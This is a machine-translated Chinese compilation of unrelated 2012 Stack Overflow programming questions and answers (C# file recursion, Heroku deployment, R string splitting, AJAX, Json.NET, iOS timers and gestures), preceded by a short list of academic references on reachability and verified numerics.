[1] 线性向量场族的符号可达性计算。Gerardo Lafferriere、George J. Pappas 和 Sergio Yovine。符号计算杂志，32(3):231-253，2001 年 9 月[。http ://www.seas.upenn.edu/~pappasg/papers/JSC01.pdf](http://www.seas.upenn.edu/~pappasg/papers/JSC01.pdf)

[2] E. Asarin, T. Dang, A. Girard, 非线性系统分析的杂交方法, Acta Informatica, 43:7, 2007, 451-476, [http://www.springerlink.com/content/q6755l613l856737 /](http://www.springerlink.com/content/q6755l613l856737/)

[3] 计算矩阵指数的 19 种可疑方法，二十五年后，Cleve Moler 和 Charles Van Loan，SIAM 评论，卷。45，第 1 期（2003 年 3 月），第 3-49 页，[http://www.jstor.org/stable/25054364](http://www.jstor.org/stable/25054364)

[4] 分析函数的自动、保证集成，Martin C. Eiermann，BIT NUMERICAL MATHEMATICS，1989，[http://www.springerlink.com/content/q2k30rtx2h2n1815/](http://www.springerlink.com/content/q2k30rtx2h2n1815/)

[5] GRKLib：保证龙格库塔图书馆，Bouissou, O., Martel, M.，科学计算，计算机算术和验证数值，2006 年，[http ://ieeexplore.ieee.org/xpls/abs_all.jsp?arnumber= 4402398](http://ieeexplore.ieee.org/xpls/abs_all.jsp?arnumber=4402398)

[6] MetiTarski Proofs 的实数代数策略，Grant Olney Passmore，Lawrence C. Paulson 和 Leonardo de Moura。智能计算机数学会议 (CICM/AISC)，2012，[http://research.microsoft.com/en-us/um/people/leonardo/CICM2012.pdf](http://research.microsoft.com/en-us/um/people/leonardo/CICM2012.pdf)

# c# - 递归获取文件：跳过无法读取的文件/目录？

> ID：11927116
> 
> 赞同：8
> 
> 时间：2012-08-13T01:00:18.100
> 
> 标签：c#, file, exception, directory

我想获取数组中目录中的所有文件（包括子文件夹中的文件）

```
string[] filePaths = Directory.GetFiles(@"c:\",SearchOption.AllDirectories); 
```

这样做的问题是：如果抛出异常，则整个命令将停止。有没有更好的方法来做到这一点，这样如果一个文件夹无法访问，它就会跳过它？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-13T01:12:47.600

那时你可能需要自己做更多的输入，然后编写一个像这样的目录遍历器：

```
 public static string[] FindAllFiles(string rootDir) {
        var pathsToSearch = new Queue<string>();
        var foundFiles = new List<string>();

        pathsToSearch.Enqueue(rootDir);

        while (pathsToSearch.Count > 0) {
            var dir = pathsToSearch.Dequeue();

            try {
                var files = Directory.GetFiles(dir);
                foreach (var file in Directory.GetFiles(dir)) {
                    foundFiles.Add(file);
                }

                foreach (var subDir in Directory.GetDirectories(dir)) {
                    pathsToSearch.Enqueue(subDir);
                }

            } catch (Exception /* TODO: catch correct exception */) {
                // Swallow.  Gulp!
            }
        }

        return foundFiles.ToArray();
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-02-06T09:48:52.837

Directory.GetFiles 不能跳过经常导致循环然后异常的目录符号链接。

因此，根据@iks 的回答和[检查文件是真实的还是符号链接](https://stackoverflow.com/questions/1485155/check-if-a-file-is-real-or-a-symbolic-link)，这里有一个版本，可以像 Directory.EnumerateFiles 一样随时随地提供结果：

```
 public static IEnumerable<string> FindAllFiles(string rootDir)
    {
        var pathsToSearch = new Queue<string>();

        pathsToSearch.Enqueue(rootDir);

        while (pathsToSearch.Count > 0)
        {
            var dir = pathsToSearch.Dequeue();
            var foundFiles = new List<string>();
            try
            {
                foreach (var file in Directory.GetFiles(dir))
                    foundFiles.Add(file);

                foreach (var subDir in Directory.GetDirectories(dir))
                {
                    //comment this if want to follow symbolic link
                    //or follow them conditionally
                    if (IsSymbolic(subDir)) continue;
                    pathsToSearch.Enqueue(subDir);
                }
            }
            catch (Exception) {//deal with exceptions here
            }
            foreach (var file in foundFiles) yield return file;
        } 

    }

    static private bool IsSymbolic(string path)
    {
        FileInfo pathInfo = new FileInfo(path);
        return pathInfo.Attributes.HasFlag(System.IO.FileAttributes.ReparsePoint);
    }

    static public void test()
    {
        string root = @"D:\root";
        foreach (var fn in FindAllFiles(root)
            .Where(x=>
            true    //filter condition here
            ))
        {
            Debug.WriteLine(fn);
        }
    } 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-08-13T01:18:53.633

试试这个 ：

```
DirectoryInfo directory = new DirectoryInfo(@"c:\");
        DirectoryInfo[] folders = directory.GetDirectories("*", SearchOption.AllDirectories);

        List<string> files = new List<string>();
        foreach (DirectoryInfo info in folders)
        {
            foreach (FileInfo file in info.GetFiles())
            {
                files.Add(file.Name);
            }
        } 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-08-13T01:27:43.677

或试试这个：

```
 DirectoryInfo dirs = new DirectoryInfo(@"c:\");
        List<string> filenames = (from i in dirs.GetFiles("*", SearchOption.AllDirectories)
                                  select i.Name).ToList(); 
```

或不带扩展名的文件名：

```
 DirectoryInfo dirs = new DirectoryInfo@"c:\");
        List<string> filenames = (from i in dirs.GetFiles("*", SearchOption.AllDirectories)
                                  select System.IO.Path.GetFileNameWithoutExtension(i.Name)).ToList(); 
```

# ruby-on-rails - 无法部署到 Heroku（有史以来第一次）

> ID：11927119
> 
> 赞同：0
> 
> 时间：2012-08-13T01:00:52.550
> 
> 标签：ruby-on-rails, ruby, deployment, heroku

我正在尝试遵循 Hartl 的教程。在第一章的结尾，他让我们部署到 Heroku 的站点。我试过这样做，但没有奏效。

这是四天前的事了。我再次尝试......并注意到当我执行“git push heroku master”时，我得到了这个：

```
ssh: connect to host heroky.com port 22: Connection refused
fatal: The remote end hung up unexpectedly 
```

注意到上面写着 heroky.com 了吗？应该是这样吗？

当我执行“git config --list”时，它指出：

```
remote.heroku.url=git@heroky.com:{first_app}.git 
```

我对这一切都很陌生，所以任何解决这个问题的建议都会非常感激。

**编辑：**

根据下面的评论，我编辑了 .git/config 文件并将 heroky 重置为 heroku。

但现在，我得到：

```
Warning: Permanently added the RSA host key for IP address 'xx.xx.xx.xxx'(not really x's) to the list of known       hosts.
Permission denied (publickey).
fatal: The remote end hung up unexpectedly 
```

这是什么意思？

**编辑2：**

不要介意许可被拒绝。我显然输入了错误的密码。现在我遇到了一个让我难过的新问题。

当我再次尝试“git push heroku master”时，这就是我得到的：

```
!  No such app as first_app.

fatal: The remote end hung up unexpectedly 
```

为什么？？？？

这是我的配置文件：

```
[core]
repositoryformatversion = 0
filemode = true
bare = false
logallrefupdates = true
ignorecase = true
[remote "origin"]
url = https://github.com/name_removed/first_app.git
fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
remote = origin
merge = refs/heads/master
[remote "heroku"]
url = git@heroku.com:first_app.git
fetch = +refs/heads/*:refs/remotes/heroku/* 
```

**编辑 3**

原来问题出在这一行： url = git@heroku.com:first_app.git

将 first_app.git 更改为 Heroku 的应用程序 url。然后它起作用了！

谢谢大家。不知道如何给予信任等等......因为是elithrar的评论首先开始了解决整个问题的问题。它没有解决它，但它把我带到了某个地方。一个交易点，信用等如何在这里？还是我也应该赞扬 jli，因为他以答案格式回答？（是的，我想太多了）。

**编辑 4**

实际上，我还有一个问题......为什么我必须编辑我的配置文件来更改 first_app.git 行？那不应该是自动的吗？我很困惑整个事情是如何处理的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T02:17:52.940

您将远程主机设置为`heroky`而不是`heroku`. 只需将其更改为`heroku`即可。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T02:15:21.623

你在代理后面吗？您可能需要修改 .ssh/config 使其看起来像这样：

```
Host git_heroku
  Hostname heroku.com
  User git
  ProxyCommand {"proxy config info specific to you
  Port 443 
```

在您的 .git/config 更改中

```
git@heroku.com 
```

至

```
git_heroku 
```

引用此 SO 线程也可能对您有所帮助：

[git push heroku master 中的错误通过代理后面的 ssh](https://stackoverflow.com/questions/10555546/error-in-git-push-heroku-master-through-ssh-behind-proxy)

# string - R使用“”将字符串转换为向量标记

> ID：11927121
> 
> 赞同：21
> 
> 时间：2012-08-13T01:01:15.937
> 
> 标签：string, r, vector

我有一个字符串：

```
string1 <- "This is my string" 
```

我想将其转换为如下所示的向量：

```
vector1
"This"
"is"
"my"
"string" 
```

我该怎么做呢？我知道我可以使用`tm`包转换为`termDocumentMatrix`然后转换为矩阵，但它会按字母顺序排列单词，我需要它们保持相同的顺序。

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2012-08-13T01:06:16.213

您可以使用 strsplit 来完成此任务。

```
string1 <- "This is my string"
strsplit(string1, " ")[[1]]
#[1] "This"   "is"     "my"     "string" 
```

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2012-08-13T09:05:16.600

与 Dason 略有不同，但这将拆分为任意数量的空白，包括换行符：

```
string1 <- "This   is my
string"
strsplit(string1, "\\s+")[[1]] 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2015-01-01T06:48:10.093

作为补充，我们还可以使用`unlist()`给定列表结构生成向量：

```
string1 <- "This is my string"  # get a list structure
unlist(strsplit(string1, "\\s+"))  # unlist the list
#[1] "This"   "is"     "my"     "string" 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2015-01-01T07:33:21.160

如果您只是通过分割空格来提取单词，这里有几个不错的选择。

```
string1 <- "This is my string"

scan(text = string1, what = "")
# [1] "This"   "is"     "my"     "string"

library(stringi)
stri_split_fixed(string1, " ")[[1]]
# [1] "This"   "is"     "my"     "string"
stri_extract_all_words(string1, simplify = TRUE)
#      [,1]   [,2] [,3] [,4]    
# [1,] "This" "is" "my" "string"
stri_split_boundaries(string1, simplify = TRUE)
#      [,1]    [,2]  [,3]  [,4]    
# [1,] "This " "is " "my " "string" 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-08-11T20:24:48.297

尝试：

```
library(tm)
library("RWeka")
library(RWekajars)
NGramTokenizer(source1, Weka_control(min = 1, max = 1)) 
```

这是针对您的问题的过度设计的解决方案。strsplit 使用 Sacha 的方法通常很好。

# encoding - 了解文件的编码方式

> ID：11927122
> 
> 赞同：0
> 
> 时间：2012-08-13T01:01:27.887
> 
> 标签：encoding, character-encoding

我有一个 1990 年代称为 ocl 的会计程序，该程序不再正常运行，我想提取数据，当以崇高的文本打开文件时，它给了我一个长文件，如下所示

```
393d 2020 2020 2020 2020 2020 5072 6576
696f 7573 2054 7261 6e73 2020 2020 2020
2020 2020 2020 2020 2020 2020 2020 2020
2020 2035 3430 322e 3235 0000 0000 0000
0000 0000 0000 0000 0000 0000 0000 0000 
```

我的问题是有人知道这是什么或如何解码它吗？我会很感激任何想法

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T01:14:32.043

尝试将其作为文本读取，即 ASCII。如果你在文本编辑器或十六进制编辑器中打开它，你会看到一些可读的部分。请注意，这`20`是 space 的十六进制 ASCII 值`' '`。您发布的部分对此进行了解码：

```
9=          Previous Trans                         5402.25 
```

随后是一系列空 ( `00`) 字节。

# c# - 为什么这个 AJAX 调用需要这么长时间？

> ID：11927123
> 
> 赞同：2
> 
> 时间：2012-08-13T01:01:44.957
> 
> 标签：c#, javascript, jquery, ajax, asp.net-mvc

这通常需要 2-4 秒，这对于它正在做的工作来说似乎太长了。这是 AJAX：

```
$("#IngTable").html("<center><img src=../img/loading.gif /></center>");

    var search = document.getElementById("IngSearch").value;
    var apiLink = "/API/Ingredient/Search?search=" + search;
    $.ajaxSetup({ accepts: "application/json" });
    $.ajax({
        url: apiLink,
        type: "GET",
        success: function(data) {
            var ingredients = JSON.parse(data);
            var htmlIngred = "";
            for (var i = 0; i < ingredients.length; i++) {
                htmlIngred += "<tbody><td><span>" + ingredients[i].Name + "</span></td><td><a class='btn btn-success btn-mini' onclick='addIngred(" + ingredients[i].IngredientId + ");'>Add</a></td></tbody>";
            }
            document.getElementById("IngTable").innerHTML = htmlIngred;
        },
        error: function (a, b, c) { }
    }); 
```

这是 Web API 控制器：

```
 [HttpGet]
    public string IngredientSearch(string search)
    {
        var sw = Stopwatch.StartNew();
        var db = new Glubee.Model.GlubeeEntities();
        var results = db.Ingredients.Where(x => x.Name.Contains(search)).ToArray();
        sw.Stop();
        return JsonConvert.SerializeObject(results);
    } 
```

配料表中只有 16 件东西，每件不超过 20 个字符。

有谁知道问题可能出在哪里，这使得它需要这么长时间？

编辑：如果有帮助，这是我的 Global.asax.cs 页面：

```
public class MvcApplication : System.Web.HttpApplication
{
    protected void Application_Start()
    {
        AreaRegistration.RegisterAllAreas();

        FilterConfig.RegisterGlobalFilters(GlobalFilters.Filters);
        RouteConfig.RegisterRoutes(RouteTable.Routes);
        BundleConfig.RegisterBundles(BundleTable.Bundles);
    } 
```

这是我的 RouteConfig：

```
public class RouteConfig
{
    public static void RegisterRoutes(RouteCollection routes)
    {
        routes.IgnoreRoute("{resource}.axd/{*pathInfo}");

        routes.MapHttpRoute(
            name: "DefaultApi",
            routeTemplate: "api/{controller}/{id}",
            defaults: new { id = RouteParameter.Optional }
        );

        routes.MapRoute(
            name: "Default",
            url: "{controller}/{action}/{id}",
            defaults: new { controller = "Home", action = "Index", id = UrlParameter.Optional }
        );
    }
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-13T01:51:03.433

你有没有明确什么是慢的呢？

例如; 在您的 IngredientSearch 方法中，如果您将代码从

```
[HttpGet]
public string IngredientSearch(string search)
{
    var sw = Stopwatch.StartNew();
    var db = new Glubee.Model.GlubeeEntities();
    var results = db.Ingredients.Where(x => x.Name.Contains(search)).ToArray();
    sw.Stop();
    return JsonConvert.SerializeObject(results);
} 
```

到

```
[HttpGet]
public string IngredientSearch(string search)
{
    return String.Empty;
} 
```

还需要很长时间吗？

如果是这样的话; 然后我们必须看看一个脚本库问题；如果不是 - 那么是你的数据库层有问题。

像这样的错误通常很难追踪，因此您*必须*忘记假设并一点一点地测试。上面的改动消除了很多问题，因为很少的努力给了你很大的线索。

PS：对不起，我知道这不是一个答案；但我想将它作为一个发布，以便我可以清楚地突出代码更改；请不要投反对票！

# ios - 在 NSRunLoop 中取消 NSTimer

> ID：11927126
> 
> 赞同：0
> 
> 时间：2012-08-13T01:02:30.703
> 
> 标签：ios, nstimer, nsrunloop

我目前正在这样做：

```
timer = [NSTimer timerWithTimeInterval:timeUntilAction target:self selector:@selector(actionToPerform) userInfo:nil repeats:NO];
NSRunLoop *runLoop = [NSRunLoop currentRunLoop];
[runLoop addTimer:timer forMode:NSRunLoopCommonModes]; 
```

但我希望能够使该计时器无效。调用 invalidate 似乎没有做任何事情，我不知道还能尝试什么，因为我无法从`NSRunLoop`我可以看到的任何实例方法中删除计时器`NSTimer`or `NSRunLoop`。

我应该如何设置一个方法（actionToPerform）在一定的延迟（timeUntilAction）后触发，但仍然有能力取消动作，给定的用户交互。用户还应该能够在初始计时器（已取消的计时器）计划关闭之前重新启动计时器。

任何建议都会很棒！

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T02:19:17.677

```
[self performSelector:@selector(actionToPerform) withObject:nil afterDelay:timeUntilAction]

[NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(actionToPerform) object:nil] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-02-26T15:39:26.210

你可以在 NSRunLoop 中取消 NSTimer。即使你没有在 NSTimer 和 NSRunloop 中找到 API，你也可以试试 CFRunLoop。根据Apple [here](https://developer.apple.com/library/prerelease/mac/documentation/CoreFoundation/Reference/CFRunLoopRef/index.html#//apple_ref/c/func/CFRunLoopRemoveTimer)，看看如何：

第一的，

`CFRunLoopRef *cfrl = [NSRunLoop getCFRunLoop];`

然后，

CFRunLoopAddTimer

```
void CFRunLoopAddTimer ( CFRunLoopRef rl, CFRunLoopTimerRef timer, CFStringRef mode ); 
```

CFRunLoopRemoveTimer

```
void CFRunLoopRemoveTimer ( CFRunLoopRef rl, CFRunLoopTimerRef timer, CFStringRef mode ); 
```

PS特别是关于

`- (void)performSelector:(SEL)aSelector withObject:(id)anArgument afterDelay:(NSTimeInterval)delay`

见苹果文档。对于[NSObject](https://developer.apple.com/library/mac/documentation/Cocoa/Reference/Foundation/Classes/NSObject_Class/#//apple_ref/occ/instm/NSObject/performSelector:withObject:afterDelay:)

> **特别注意事项**
> 
> 此方法向其当前上下文的 runloop 注册，并依赖于该 runloop 定期运行以正确执行。您可能会调用此方法并最终注册到一个不会定期自动运行的 runloop 的一个常见上下文是当被调度队列调用时。如果您在调度队列上运行时需要这种类型的功能，您应该使用`dispatch_after`和相关的方法来获得您想要的行为。

此外，您可以在 GitHub 上使用**MSWeakTimer**。

# javascript - Angularjs 打破了 coffeescript 函数表达式

> ID：11927131
> 
> 赞同：13
> 
> 时间：2012-08-13T01:03:47.693
> 
> 标签：javascript, coffeescript, angularjs

我正在将 AngularJs 集成到一个示例 Nodejs 应用程序中。我的控制器如下：

```
UsersCtrl = ($scope, $http) ->    
   $scope.newUser = {}
   $scope.users = [
     name: "aloman"
     email: "aloman@example.com"
   ] 
```

编译成javascript：

```
// Generated by CoffeeScript 1.3.3
(function() {
  var UsersCtrl;

  UsersCtrl = function($scope, $http) {
    $scope.newUser = {}; 
    return $scope.users = [ 
      {   
        name: "aloman",
        email: "aloman@example.com"
      }   
    ];  
  };
}).call(this); 
```

上面的代码与控制台日志中断：
错误：参数'UsersCtrl'不是函数，未定义

但是，删除包裹在已编译 javascript 周围的匿名函数可以正常工作。工作代码如下所示。

```
var UsersCtrl;
Usersctrl = function($scope, $http) {
    $scope.newUser = {};
    $scope.users = [{
        name: "aloman",
        email: "aloman@example.com" 
    }];
}; 
```

我编译的代码不起作用的任何原因。我觉得这与 Angular 的作用域注入有关。我正在使用 AngularJS 1.0.1

* * *

## 回答 #1

> 赞同：38
> 
> 时间：2012-08-13T12:55:52.517

最好使用此语法，以免污染全局范围：

`angular.module('myApp').controller('MyController', ($scope) ->)`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-29T05:27:00.800

尽管所有当前的答案都是正确的，但还有第三个选项：

当您将 CoffeeScript 编译为 JavaScript 时，请确保将`--bare`选项设置为 CoffeeScript 编译器，这会使他在输出中省略函数包装器。

# c# - 将 JToken（或字符串）转换为给定的类型

> ID：11927135
> 
> 赞同：75
> 
> 时间：2012-08-13T01:05:25.003
> 
> 标签：c#, windows-phone-7, json.net, restsharp

**TL;DR 版本**

我有一个类型的对象`JToken`（但也可以是 a `string`），我需要将其转换为包含在`type`变量中的类型：

```
Type type = typeof(DateTime); /* can be any other Type like string, ulong etc */
var obj = jsonObject["date_joined"]; /* contains 2012-08-13T06:01:23Z+05:00 */
var result = Some_Way_To_Convert(type, obj); 
```

以上`result`应该是一个 DateTime 对象，其值在`date_joined`.

**全文**

我在 Windows Phone 项目中同时使用 RestSharp 和 Json.NET，但在尝试反序列化来自 REST API 的 JSON 响应时遇到了困难。

我实际上想要完成的是编写一个通用方法，可以轻松地将我的 JSON 响应映射到我的 CLR 实体中，就像你已经可以使用 RestSharp 一样。唯一的问题是默认的 RestSharp 实现对我不起作用，它无法成功解析 JSON，因为响应并不总是返回所有属性（我不返回`null`来自 REST 服务器的字段）。

这就是我决定使用 Newtonsoft 的 Json.NET 的原因，因为它具有更强大的 Json 反序列化引擎。不幸的是，它不支持像 RestSharp 这样的模糊属性/字段名称（或者我没有找到任何名称），所以当我使用 say 之类的东西时，它也不能正确映射到我的 CLR 实体`JsonConvert.DeserializeObject<User>(response.Content)`。

这是我的 Json 的样子（实际上是一个例子）：

```
{
    "id" : 77239923,
    "username" : "UzEE",
    "email" : "uzee@email.net",
    "name" : "Uzair Sajid",
    "twitter_screen_name" : "UzEE",
    "join_date" : "2012-08-13T05:30:23Z05+00",
    "timezone" : 5.5,
    "access_token" : {
        "token" : "nkjanIUI8983nkSj)*#)(kjb@K",
        "scope" : [ "read", "write", "bake pies" ],
        "expires" : 57723
    },
    "friends" : [{
        "id" : 2347484",
        "name" : "Bruce Wayne"
    },
    {
        "id" : 996236,
        "name" : "Clark Kent"
    }]
} 
```

这是我的 CLR 实体的示例：

```
class AccessToken 
{
    public string Token { get; set; }
    public int Expires { get; set; }
    public string[] Scope { get; set; }
    public string Secret { get; set; } /* may not always be returned */
}

class User
{
    public ulong Id { get; set; }
    public string UserName { get; set; }
    public string Email { get; set; }
    public string Name { get; set; }
    public string TwitterScreenName { get; set; }
    public DateTime JoinDate { get; set; }
    public float Timezone { get; set; }
    public bool IsOnline { get; set; } /* another field that might be blank e.g. */

    public AccessToken AccessToken { get; set; }

    public List<User> Friends { get; set; }
} 
```

我想要的是一种将上述 JSON 解析为给定 CLR 对象的简单方法。我查看了 RestSharp 源代码并查看了`JsonDeserializer`代码，并且我已经能够编写一个通用扩展方法`DeserializeResponse<T>`，`JObject`它应该返回一个 type 的对象`T`。预期用途是这样的：

```
var user = JObject.Parse(response.Content).DeserializeResponse<User>(); 
```

上述方法应该将给定的 Json 响应解析为用户实体对象。这是我在`DeserializeResponse<User>`扩展方法中所做的实际代码片段（它基于 RestSharp 代码）：

```
public static T DeserializeResponse<T>(this JObject obj) where T : new()
{
    T result = new T();
    var props = typeof(T).GetProperties().Where(p => p.CanWrite).ToList();
    var objectDictionary = obj as IDictionary<string, JToken>;

    foreach (var prop in props)
    {
        var name = prop.Name.GetNameVariants(CultureInfo.CurrentCulture).FirstOrDefault(n => objectDictionary.ContainsKey(n));
        var value = name != null ? obj[name] : null;

        if (value == null) continue;

        var type = prop.PropertyType;

        if (type.IsGenericType && type.GetGenericTypeDefinition() == typeof(Nullable<>))
        {
            type = type.GetGenericArguments()[0];
        }

        // This is a problem. I need a way to convert JToken value into an object of Type type
        prop.SetValue(result, ConvertValue(type, value), null); 
    }

    return result;
} 
```

我猜测转换应该是一件非常简单的事情，因为它是一项微不足道的任务。但是我已经搜索了很长一段时间，但仍然没有找到通过 Json.NET 实现它的方法（老实说，文档有点理解并且缺少一些示例）。

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：135
> 
> 时间：2013-12-05T18:20:31.660

现在有一个 ToObject 方法。

```
var obj = jsonObject["date_joined"];
var result = obj.ToObject<DateTime>(); 
```

它也适用于任何复杂类型，并遵守 JsonPropertyAttribute 规则

```
var result = obj.ToObject<MyClass>();

public class MyClass 
{ 
    [JsonProperty("date_field")]
    public DateTime MyDate {get;set;}
} 
```

* * *

## 回答 #2

> 赞同：24
> 
> 时间：2012-08-13T11:50:32.243

```
System.Convert.ChangeType(jtoken.ToString(), targetType); 
```

或者

```
JsonConvert.DeserializeObject(jtoken.ToString(), targetType); 
```

**- 编辑 -**

Uzair，这是一个完整的例子，只是为了向你展示他们的工作

```
string json = @"{
        ""id"" : 77239923,
        ""username"" : ""UzEE"",
        ""email"" : ""uzee@email.net"",
        ""name"" : ""Uzair Sajid"",
        ""twitter_screen_name"" : ""UzEE"",
        ""join_date"" : ""2012-08-13T05:30:23Z05+00"",
        ""timezone"" : 5.5,
        ""access_token"" : {
            ""token"" : ""nkjanIUI8983nkSj)*#)(kjb@K"",
            ""scope"" : [ ""read"", ""write"", ""bake pies"" ],
            ""expires"" : 57723
        },
        ""friends"" : [{
            ""id"" : 2347484,
            ""name"" : ""Bruce Wayne""
        },
        {
            ""id"" : 996236,
            ""name"" : ""Clark Kent""
        }]
    }";

var obj = (JObject)JsonConvert.DeserializeObject(json);
Type type = typeof(int);
var i1 = System.Convert.ChangeType(obj["id"].ToString(), type);
var i2 = JsonConvert.DeserializeObject(obj["id"].ToString(), type); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-30T14:19:57.183

```
var i2 = JsonConvert.DeserializeObject(obj["id"].ToString(), type); 
```

由于第一个参数周围缺少引号（我认为）而引发解析异常。我通过添加引号使其工作：

```
var i2 = JsonConvert.DeserializeObject("\"" + obj["id"].ToString() + "\"", type); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-12-17T22:58:32.377

我能够为我的 WebAPI 使用以下方法进行转换：

```
[HttpPost]
public HttpResponseMessage Post(dynamic item) // Passing parameter as dynamic
{
JArray itemArray = item["Region"]; // You need to add JSON.NET library
JObject obj = itemArray[0] as JObject;  // Converting from JArray to JObject
Region objRegion = obj.ToObject<Region>(); // Converting to Region object
} 
```

# ajax - Jquery ajax调用抛出语法无效标签错误

> ID：11927137
> 
> 赞同：0
> 
> 时间：2012-08-13T01:05:48.990
> 
> 标签：ajax, json, jquery, jsonp

我正在尝试对返回 json 对象的服务器进行 ajax 调用，但它无法正常工作......无法弄清楚有什么问题请帮助......这是代码：

```
$.ajax ({
        type : "GET",
        url : "http://api.zero1.org/v1/artists",
        data : "",
        dataType : "jsonp"
    }).done (function(msg){
        var artistNames = msg.artists[0].name;

        for (var i = 0; i < artistNames.length; i++) {
            console.log(artistNames[i])
            $('div#artists').html(function() {
                return '<li><a href="details.html"><h3 class="ul-li-heading">' + artistName[i] + '</h3><p class="ul-li-desc">artist/location</p></a></li>'
            });
        } 
    }) 
```

JSON 对象是这样的：

```
{
    artists: [
              {
                artistid: "5",
                name: "Outdoor Urban Scene  ",
                bio: "", 
                programs: [
                            1,
                            2,
                            3,
                            4 
                           ]
              },
              {
                artistid: "87",
                name: "Radames  Ajna",
                bio: "Technical development of Mobile Crash v2",
                programs: [
                            1,
                            2,
                            3,
                            4
                          ]
              }
            ]
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T01:13:48.870

您尝试使用的资源不支持 JSONP。必须正确配置服务器才能处理 JSONP 请求。

您可以编写自己的一些服务器端代码来处理 JSON 并提供它，或者您可以使用 Yahoo 的 HQL 之类的服务：

```
$.ajax({
    url: 'http://query.yahooapis.com/v1/public/yql',
    data: {
        q: 'select * from json where url="http://api.zero1.org/v1/artists"',
        format: 'json'
    },
    type: 'get',
    dataType: 'jsonp'
}) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T02:02:47.843

请尝试在`crossDomain`您的 ajax 调用中添加选项。您的代码必须以`;`

```
$.ajax ({
        type : "GET",
        url : "http://api.zero1.org/v1/artists",
        data : "",
        dataType : "jsonp",
        crossDomain: true
    }).done (function(msg){
        var artistNames = msg.artists[0].name;

        for (var i = 0; i < artistNames.length; i++) {
            console.log(artistNames[i])
            $('div#artists').html(function() {
                return '<li><a href="details.html"><h3 class="ul-li-heading">' + artistName[i] + '</h3><p class="ul-li-desc">artist/location</p></a></li>'
            });
        } 
    }); 
```

# ruby-on-rails - Heroku 上的 ImageMagick 不会将 -fill 设为“白色”

> ID：11927138
> 
> 赞同：1
> 
> 时间：2012-08-13T01:05:59.583
> 
> 标签：ruby-on-rails, heroku, imagemagick, minimagick

我正在使用 MiniMagick 和 ImageMagick 以及这段代码在本地运行 Rails 3.2 应用程序

```
img.combine_options do |c| 
    c.gravity 'Center'
    c.font "#{::Rails.root}/public/fonts/Impact.ttf" 
    c.pointsize '125'
    c.kerning '-6'
    c.draw "text 0,-120 '#{self.line1}'"
    c.draw "text 0,-16 '#{self.line2}'"
    c.draw "text 0,88 '#{self.line3}'"
    c.fill "#ffffff"
end 
```

在本地工作正常，文本按预期写在图像顶部并显示为白色。

一旦我将它部署到 Heroku（Cedar），我就没有收到任何错误，但文本以黑色写在图像的顶部。

这是我第一次在 Heroku 上同时使用 MiniMagick 和 ImageMagick，所以，也许我缺少颜色深度的东西？图片是PNG吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T15:06:18.607

在通过 ImageMagick 正确阅读MiniMagick[可用的“draw”选项的命令行选项](http://www.imagemagick.org/script/command-line-options.php#draw)后，我发现这一段解决了这个问题：

*选项按命令行顺序处理，因此请务必在 -draw 选项之前使用这些选项。*

因此，通过更改传递选项的顺序，将填充颜色移动到“绘制”参数上方解决了它，如下所示：

```
img.combine_options do |c| 
  c.gravity 'Center'
  c.font "#{::Rails.root}/public/fonts/Impact.ttf"
  c.fill "#ffffff"
  c.pointsize '125'
  c.kerning '-6'
  c.draw "text 0,-120 '#{self.line1}'"
  c.draw "text 0,-16 '#{self.line2}'" 
  c.draw "text 0,88 '#{self.line3}'"
end 
```

问题解决了。

# objective-c - iOS 5.0 创建 UIView 并访问触摸数据

> ID：11927139
> 
> 赞同：0
> 
> 时间：2012-08-13T01:06:12.910
> 
> 标签：objective-c, xcode, ios5

我在 Objective C 中创建了一个基本的 GLKit 应用程序（使用 Xcode），使用从这里获得的准系统设置：http: [//games.ianterrell.com/2d-game-engine-tutorial/](http://games.ianterrell.com/2d-game-engine-tutorial/)。我想通过从屏幕接收触摸数据来使我的应用程序具有交互性。

我没有 xib 文件，根据我对此的有限理解，我必须以某种方式创建一个`UIView`，将其连接到我已经创建的所有内容，然后可能重载 touches 开始函数（获取`UITouch`对象中的输入，然后在应用程序中传递它）。

有谁知道如何做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T01:36:19.460

您需要查看手势识别器，请查看以下文档：http `UIGestureRecognizer`: [//developer.apple.com/library/ios/#documentation/UIKit/Reference/UIGestureRecognizer_Class/Reference/Reference.html](http://developer.apple.com/library/ios/#documentation/UIKit/Reference/UIGestureRecognizer_Class/Reference/Reference.html)

此示例可用于视图上的捏合手势：

```
UIView *myView = [[UIView alloc] initWithFrame:CGRectMake(0, 0, 320, 400)];
// setup and add the view.

UIPinchGestureRecognizer *pinchGesture = [[UIPinchGestureRecognizer alloc] initWithTarget:self 
                                                                                   action:@selector(handlePinch:)];

[myView addGestureRecognizer:pinchGesture]; 
```

现在你必须实现一个被调用的方法`handlePinch:`（这是你定义这个方法被调用的东西），你定义这个方法如下：

```
-(void)handlePinch:(UIPinchGestureRecognizer*)gesture {
    // do what you want, all info about the pinch is in the gesture
} 
```

您可以像这样“开箱即用”的其他手势是：

```
UITapGestureRecognizer
UIPinchGestureRecognizer
UIRotationGestureRecognizer
UISwipeGestureRecognizer
UIPanGestureRecognizer
UILongPressGestureRecognizer 
```
